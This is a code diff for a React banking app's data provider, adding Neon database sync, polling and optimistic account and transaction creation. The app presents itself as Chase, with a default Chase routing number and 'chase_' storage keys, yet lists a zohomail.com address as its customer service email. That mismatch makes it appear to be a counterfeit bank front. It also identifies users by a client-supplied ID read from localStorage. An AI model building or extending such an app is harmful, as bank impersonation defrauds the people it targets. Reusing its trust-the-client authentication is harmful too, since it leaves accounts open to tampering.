@@ -14,6 +14,13 @@ import {
 import { SettingsEnforcer } from "./settings-enforcement"
 import { getRealTimeSync } from "./real-time-sync"
 import { NotificationManager } from "./notification-manager"
+import {
+  fetchUserAccounts,
+  fetchAccountTransactions,
+  setupRealtimeSync,
+  createAccountInNeon,
+  createTransactionInNeon,
+} from "./neon-api-service"
 
 export const CUSTOMER_SERVICE_EMAIL = "chase.org_info247@zohomail.com"
 export const CUSTOMER_SERVICE_PHONE = "1-800-935-9935"
@@ -465,6 +472,7 @@ export function BankingProvider({ children }: { children: React.ReactNode }) {
   const [realTimeSync] = useState(() => getRealTimeSync())
   const [notificationManager, setNotificationManager] = useState<NotificationManager | null>(null)
   const appSettingsRef = useRef<AppSettings>(null!)
+  const realtimeSyncCleanupRef = useRef<(() => void) | null>(null)
 
   // Define defaultAppSettings here to be used in clearAllData
   const defaultAppSettings: AppSettings = {
@@ -1201,92 +1209,71 @@ export function BankingProvider({ children }: { children: React.ReactNode }) {
 
     const fetchSupabaseData = async () => {
       try {
+        // Fetch accounts and transactions from Neon database API
+        console.log('[v0] Fetching banking data from Neon for user:', userId)
+        const neonAccounts = await fetchUserAccounts(userId)
+        const neonTransactions = await fetchAccountTransactions(userId)
+
+        // Update accounts from Neon if we have them
+        if (neonAccounts && neonAccounts.length > 0) {
+          console.log('[v0] Loaded accounts from Neon:', neonAccounts.length)
+          setAccounts(neonAccounts)
+        }
+
+        // Update transactions from Neon if we have them
+        if (neonTransactions && neonTransactions.length > 0) {
+          console.log('[v0] Loaded transactions from Neon:', neonTransactions.length)
+          setTransactions(neonTransactions)
+        }
+
         // Fetch user data from dashboard API
         const response = await fetch('/api/dashboard', {
           headers: { 'x-user-id': userId },
         })
 
-        if (!response.ok) return
+        if (response.ok) {
+          const dashData = await response.json()
 
-        const dashData = await response.json()
+          // Update notifications from dashboard
+          if (dashData.notifications && dashData.notifications.recent) {
+            const dbNotifs: Notification[] = dashData.notifications.recent.map((n: any) => ({
+              id: n.id,
+              title: n.title,
+              message: n.message,
+              type: n.type || 'info',
+              date: n.createdAt || new Date().toISOString(),
+              read: n.read || false,
+              category: n.category || 'General',
+            }))
+            if (dbNotifs.length > 0) {
+              setNotifications(prev => {
+                // Merge: add new DB notifs that don't already exist
+                const existingIds = new Set(prev.map(n => n.id))
+                const newNotifs = dbNotifs.filter(n => !existingIds.has(n.id))
+                return [...newNotifs, ...prev]
+              })
+            }
+          }
+        }
 
-        // Update user profile from stored data
-        const storedUserData = localStorage.getItem("chase_user_data")
+        // Update user profile from localStorage
+        const storedUserData = localStorage.getItem("chase_user_data") || localStorage.getItem("user_profile")
         if (storedUserData) {
           try {
             const userData = JSON.parse(storedUserData)
-            if (userData.name && userData.email) {
+            if (userData.name || userData.full_name) {
               setUserProfile(prev => ({
                 ...prev,
                 id: userData.id || prev.id,
-                name: userData.name,
-                email: userData.email,
+                name: userData.name || userData.full_name || prev.name,
+                email: userData.email || prev.email,
                 phone: userData.phone || prev.phone,
               }))
             }
           } catch { /* ignore parse errors */ }
         }
 
-        // Update accounts from Supabase data
-        const storedAccounts = localStorage.getItem("chase_user_accounts")
-        if (storedAccounts) {
-          try {
-            const dbAccounts = JSON.parse(storedAccounts)
-            if (dbAccounts && dbAccounts.length > 0) {
-              const mappedAccounts: Account[] = dbAccounts.map((acc: any) => ({
-                id: acc.id,
-                name: acc.name || 'Checking Account',
-                type: acc.account_type || acc.type || 'checking',
-                balance: parseFloat(acc.balance) || 0,
-                availableBalance: parseFloat(acc.available_balance || acc.balance) || 0,
-                accountNumber: acc.full_account_number || acc.account_number || '****0000',
-                routingNumber: acc.routing_number || '021000021',
-                interestRate: parseFloat(acc.interest_rate) || 0,
-              }))
-              setAccounts(mappedAccounts)
-            }
-          } catch { /* ignore parse errors */ }
-        }
 
-        // Update transactions from dashboard
-        if (dashData.recentTransactions && dashData.recentTransactions.length > 0) {
-          const mappedTx: Transaction[] = dashData.recentTransactions.map((tx: any) => ({
-            id: tx.id,
-            description: tx.description,
-            amount: parseFloat(tx.amount) || 0,
-            date: tx.date || new Date().toISOString(),
-            type: tx.type === 'credit' || tx.type === 'deposit' ? 'credit' : 'debit',
-            category: tx.category || 'General',
-            status: tx.status || 'completed',
-            reference: tx.reference || '',
-          }))
-          setTransactions(prev => {
-            // Only replace if we have real DB transactions
-            if (mappedTx.length > 0) return mappedTx
-            return prev
-          })
-        }
-
-        // Update notifications from dashboard
-        if (dashData.notifications && dashData.notifications.recent) {
-          const dbNotifs: Notification[] = dashData.notifications.recent.map((n: any) => ({
-            id: n.id,
-            title: n.title,
-            message: n.message,
-            type: n.type || 'info',
-            date: n.createdAt || new Date().toISOString(),
-            read: n.read || false,
-            category: n.category || 'General',
-          }))
-          if (dbNotifs.length > 0) {
-            setNotifications(prev => {
-              // Merge: add new DB notifs that don't already exist
-              const existingIds = new Set(prev.map(n => n.id))
-              const newNotifs = dbNotifs.filter(n => !existingIds.has(n.id))
-              return [...newNotifs, ...prev]
-            })
-          }
-        }
       } catch (error) {
         console.error('[v0] Error fetching Supabase data:', error)
       }
@@ -1294,6 +1281,23 @@ export function BankingProvider({ children }: { children: React.ReactNode }) {
 
     // Fetch initial data
     fetchSupabaseData()
+
+    // Setup Neon real-time polling (every 30 seconds)
+    const cleanup = setupRealtimeSync(
+      userId,
+      ({ accounts: newAccounts, transactions: newTransactions }) => {
+        console.log('[v0] Real-time sync update from Neon')
+        if (newAccounts.length > 0) {
+          setAccounts(newAccounts)
+        }
+        if (newTransactions.length > 0) {
+          setTransactions(newTransactions)
+        }
+      },
+      30000 // 30 second interval
+    )
+
+    realtimeSyncCleanupRef.current = cleanup
 
     // Set up real-time Supabase listeners for live updates
     const setupRealtimeListeners = async () => {
@@ -1408,7 +1412,12 @@ export function BankingProvider({ children }: { children: React.ReactNode }) {
     }
 
     return () => {
-      // Cleanup channels
+      // Cleanup Neon real-time sync
+      if (realtimeSyncCleanupRef.current) {
+        realtimeSyncCleanupRef.current()
+      }
+
+      // Cleanup Supabase channels
       const cleanup = async () => {
         try {
           const { createClient } = await import('@/lib/supabase/client')
@@ -1848,12 +1857,34 @@ export function BankingProvider({ children }: { children: React.ReactNode }) {
   )
 
   const addTransaction = useCallback((transaction: Omit<Transaction, "id" | "date">): Transaction => {
+    const tempId = `tx${Date.now()}`
     const newTransaction: Transaction = {
       ...transaction,
-      id: `tx${Date.now()}`,
+      id: tempId,
       date: new Date().toISOString(),
     }
+    
+    // Optimistically add to UI
     setTransactions((prev) => [newTransaction, ...prev])
+    
+    // Create in Neon database if we have account ID
+    const userId = localStorage.getItem('userId')
+    if (userId && transaction.accountId) {
+      createTransactionInNeon(userId, transaction.accountId, {
+        type: transaction.type,
+        amount: transaction.amount,
+        description: transaction.description,
+      }).then((dbTransaction) => {
+        if (dbTransaction) {
+          // Update with real ID from database
+          setTransactions((prev) =>
+            prev.map((tx) => (tx.id === tempId ? dbTransaction : tx))
+          )
+          console.log('[v0] Transaction created in Neon:', dbTransaction.id)
+        }
+      })
+    }
+    
     return newTransaction
   }, [])
 
@@ -1862,11 +1893,33 @@ export function BankingProvider({ children }: { children: React.ReactNode }) {
   }, [])
 
   const addAccount = useCallback((account: Omit<Account, "id">) => {
+    // Generate temporary ID while creating in Neon
+    const tempId = `acc${Date.now()}`
     const newAccount: Account = {
       ...account,
-      id: `acc${Date.now()}`,
+      id: tempId,
     }
+    
+    // Optimistically add to UI
     setAccounts((prev) => [...prev, newAccount])
+    
+    // Create in Neon database
+    const userId = localStorage.getItem('userId')
+    if (userId) {
+      createAccountInNeon(userId, {
+        account_type: account.type,
+        currency: 'USD',
+        balance: 0,
+      }).then((dbAccount) => {
+        if (dbAccount) {
+          // Update with real ID from database
+          setAccounts((prev) =>
+            prev.map((acc) => (acc.id === tempId ? dbAccount : acc))
+          )
+          console.log('[v0] Account created in Neon:', dbAccount.id)
+        }
+      })
+    }
   }, [])
 
   const calculateSpending = useCallback(
